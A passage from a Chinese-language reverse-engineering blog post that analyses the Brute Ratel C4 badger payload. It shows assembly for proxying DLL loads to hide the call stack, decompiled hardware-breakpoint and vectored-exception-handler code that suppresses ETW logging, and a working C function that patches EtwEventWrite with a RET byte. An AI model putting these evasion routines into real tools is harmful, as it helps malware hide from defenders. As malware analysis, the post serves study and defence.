    extern getLoadLibraryA
    
    global WorkCallback
    WorkCallback:
        mov rcx, rdx
        xor rdx, rdx
        call getLoadLibraryA
        jmp rax

可以看到堆栈非常干净  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/6958401463ade15e48fa21630a852d50-1729856329175-2.png)

### 规避ETW事件日志记录

> 他们在ETW调用的两个常见函数“**NtTraceEvent** “和“**NtTraceControl** ”上设置硬件断点，以记录进程事件。然后，它们注册自己的VEH来捕获EXCEPTION_SINGLE_STEP异常，这在命中硬件断点时发生。  
> 过修补负责生成或跟踪系统事件的已知API来规避Windows事件跟踪（ETW）和AMSI Windows机制。
> 
> 它使用“0xC3”操作码修补“EtwEventWrite”API，该操作码是一个“返回指令”，用于规避ETW事件跟踪日志记录。

当断点被命中并且处理程序捕获时，执行被重定向到一个除了返回零之外什么也不做的伪函数。这会阻止实际的函数逻辑执行，因此不会记录事件。  
内核是否在记录  
**伪代码：**
    
    
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == (unsigned int)EXCEPTION_SINGLE_STEP) // check the code that triggered the handler (it triggers when a  
    {  
    ExceptionAddress = ExceptionInfo->ExceptionRecord->ExceptionAddress; // the address where the exception occured  
    if (ExceptionAddress == (PVOID)NtTraceEvent)  //
    {  
    ContextRecord = ExceptionInfo->ContextRecord;   
    v4 = ret_0;  
    LABEL_9:  
    ContextRecord->Rip = (DWORD64)v4;  
    return 0xFFFFFFFFLL; 
    }  
    if (ExceptionAddress == (PVOID)NtTraceControl)  //
    {  
    ExceptionInfo->ContextRecord->Rip = (DWORD64)some_junk_ret_0;  
    return 0xFFFFFFFFLL;  
    }  
    if (qword_2B18D20 && ExceptionAddress == (PVOID)qword_2B18D20)  
    {  
    ContextRecord = ExceptionInfo->ContextRecord;  
    v4 = (_int64 (*)())sub_2AE3AB0;  
    goto LABEL_9;  
    }  
    }  
    return result;
    
    
    hHandler = RtlAddVectoredExceptionHandler(1LL, VectoredExceptionHandler); // register a vector exception handler to be called first whenever a new exception occur  
    if (hHandler)  
    setHWBP(0xFFFFFFFFFFFFFFFEULL, NtTraceControl, 0LL, v6);
    
    
    ```
    https://xz.aliyun.com/t/14691?time__1311=GqAhYKBK0K7Ix05DKA4YTwmpditFG8jfeD
    
    ETW的组件是内置在Windows的内核当中的,使用整个Windows拥有了事件追踪和监控的能力,但是在用户称有部分ETW API,开发者用这些API进行交互使用.  
    下面是这些API  
    EtwEventWrite和EtwEventWriteEx.StartTraceA 和 StopTraceA.QueryAllTraces.可以通过内存补丁来修补这些API实现bypass ETW  
    代码如下  
    etwPatch 数组,其中包含了要写入 EtwEventWrite 函数的第一个字节(0xC3, 即 RET 指令)
    
    ```c
    void patchETW() {
        void* etwAddr = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "EtwEventWrite");
        char etwPatch[] = { 0xC3 };
        DWORD lpflOldProtect = 0;
        unsigned __int64 memPage = 0x1000;
        void* etwAddr_bk = etwAddr;
        NtProtectVirtualMemory(hProc, (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
        NtWriteVirtualMemory(hProc, (LPVOID)etwAddr, (PVOID)etwPatch, sizeof(etwPatch), (SIZE_T*)nullptr);
        NtProtectVirtualMemory(hProc, (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
        std::cout << "[+] Patched etw!\n";
    }

![](./../pic/brute ratel C4 badger/3955ffbf45af8c876e44bcf12cf2e84b.png)

__文章作者:[helson](<https://helsome.gihub.io>)

 __文章链接:<https://helsome.gihub.io/2024/10/25/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/>

__版权声明: 本博客所有文章除特别声明外，均采用 [CC BY-NC-SA 4.0](<https://creativecommons.org/licenses/by-nc-sa/4.0/>) 许可协议。转载请注明来自 [infinite](<https://helsome.gihub.io>)！

[reverse](</tags/reverse/>)

[下一篇PE解析器编写](</2024/10/25/PE%E8%A7%A3%E6%9E%90%E5%99%A8%E7%BC%96%E5%86%99/> "PE解析器编写")

 __相关推荐

[ __2024-04-28 CobaltStrike UPX脱壳加壳](</2024/04/28/CobaltStrike-UPX%E8%84%B1%E5%A3%B3%E5%8A%A0%E5%A3%B3/> "CobaltStrike UPX脱壳加壳")

[ __2024-01-17 PE文件浅析](</2024/01/17/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%EF%BC%88%E8%87%AA%E7%94%A8%EF%BC%89/> "PE文件浅析")

[ __2024-04-28 dll injection（dll注入）](</2024/04/28/dll%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/> "dll injection（dll注入）")

[ __2024-04-28 go语言样本逆向分析特点](</2024/04/28/go%E8%AF%AD%E8%A8%80%E6%A0%B7%E6%9C%AC-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%89%B9%E7%82%B9/> "go语言样本逆向分析特点")

[ __2024-07-08 wannacry勒索病毒加密解密过程分析](</2024/07/08/wannacry/> "wannacry勒索病毒加密解密过程分析")

[ __2024-10-25 PE解析器编写](</2024/10/25/PE%E8%A7%A3%E6%9E%90%E5%99%A8%E7%BC%96%E5%86%99/> "PE解析器编写")

![avatar](/hexo-blog/source/avatar%20img.jpg)

helson

吾生有涯，其知无涯

[文章12](</archives/>)[标签4](</tags/>)[分类1](</categories/>)

[ __Follow Me](<https://github.com/helsome>)

[ __](<https://github.com/helsome> "Github")[__](<mailto:huichuanh8@gmail.com> "Email")

__公告

This is my Blog

 __目录

  1. 1. 上线流程
  2. 2. 阶段一：钓鱼过程分析
  3. 3. 阶段二：version.dll分析
     1. 3.1. 任务一：搜寻Runtimebroker.exe进程
     2. 3.2. 任务二：解密shellcode
     3. 3.3. 任务三：进程注入
     4. 3.4. 任务四：将shellcode dump出来
  4. 4. 阶段三：分析shellcode
     1. 4.1. 任务一：手动加载shllcode
     2. 4.2. 任务二：shellcode分析
  5. 5. BRC 4最终有效载荷
     1. 5.1. Unregister DLL load callbacks 取消注册DLL加载回调
     2. 5.2. 代理DLL加载以隐藏ETWTI堆栈跟踪 Proxying DLL Loads To Hide From ETWTI Stack Tracing
     3. 5.3. 规避ETW事件日志记录

 __最新文章

[brute ratel C4 badger全分析文档](</2024/10/25/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/> "brute ratel C4 badger全分析文档")2024-10-25

[PE解析器编写](</2024/10/25/PE%E8%A7%A3%E6%9E%90%E5%99%A8%E7%BC%96%E5%86%99/> "PE解析器编写")2024-10-25

[利用dll通知回调加载shellcode](</2024/10/25/%E5%88%A9%E7%94%A8dll%E9%80%9A%E7%9F%A5%E5%9B%9E%E8%B0%83%E5%8A%A0%E8%BD%BDshellcode/> "利用dll通知回调加载shellcode")2024-10-25

[os cs162](</2024/09/23/os-cs162/> "os cs162")2024-09-23

[wannacry勒索病毒加密解密过程分析](</2024/07/08/wannacry/> "wannacry勒索病毒加密解密过程分析")2024-07-08

©2020 - 2024 By helson

框架 [Hexo](<https://hexo.io>)|主题 [Butterfly](<https://github.com/jerryc127/hexo-theme-butterfly>)

 ______

______